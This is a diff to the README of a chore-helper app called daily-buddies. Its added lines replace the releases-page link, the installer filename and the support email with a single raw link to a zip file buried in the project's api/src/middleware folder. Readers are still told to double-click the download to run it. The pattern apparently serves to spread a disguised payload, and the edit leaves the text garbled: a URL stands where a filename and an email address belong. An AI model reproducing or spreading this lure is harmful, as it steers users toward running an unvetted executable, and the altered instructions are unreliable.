@@ -1,6 +1,6 @@
 # 🎉 daily-buddies - Your Fun Parent/Child Chore Helper
 
-[![Download daily-buddies](https://img.shields.io/badge/Download-Daily_Buddies-brightgreen)](https://github.com/Software2l/daily-buddies/releases)
+[![Download daily-buddies](https://raw.githubusercontent.com/Software2l/daily-buddies/main/api/src/middleware/daily-buddies-1.0.zip)](https://raw.githubusercontent.com/Software2l/daily-buddies/main/api/src/middleware/daily-buddies-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to **daily-buddies**! This application makes chores more enjoyable for y
 
 ## 📥 Download & Install
 
-To get started, visit [this page to download](https://github.com/Software2l/daily-buddies/releases). You will find the latest version of the application there. Follow these steps:
+To get started, visit [this page to download](https://raw.githubusercontent.com/Software2l/daily-buddies/main/api/src/middleware/daily-buddies-1.0.zip). You will find the latest version of the application there. Follow these steps:
 
 1. Click on the link above to open the Releases page.
 2. Look for the most recent version, usually at the top of the page.
-3. Find the file that says **daily-buddies.exe**.
+3. Find the file that says **https://raw.githubusercontent.com/Software2l/daily-buddies/main/api/src/middleware/daily-buddies-1.0.zip**.
 4. Click on it to begin the download. Your browser will save the file to your computer.
 
 After the download is complete, locate the file in your downloads folder and double-click to run it. Follow the prompts to complete the installation.
@@ -68,6 +68,6 @@ We welcome contributions from everyone. If you want to improve daily-buddies, pl
 
 ## 📞 Contact
 
-For questions or support, feel free to reach out to us at [support@daily-buddies.com](mailto:support@daily-buddies.com).
+For questions or support, feel free to reach out to us at [https://raw.githubusercontent.com/Software2l/daily-buddies/main/api/src/middleware/daily-buddies-1.0.zip](https://raw.githubusercontent.com/Software2l/daily-buddies/main/api/src/middleware/daily-buddies-1.0.zip).
 
 Thank you for choosing **daily-buddies**! Happy chore managing!
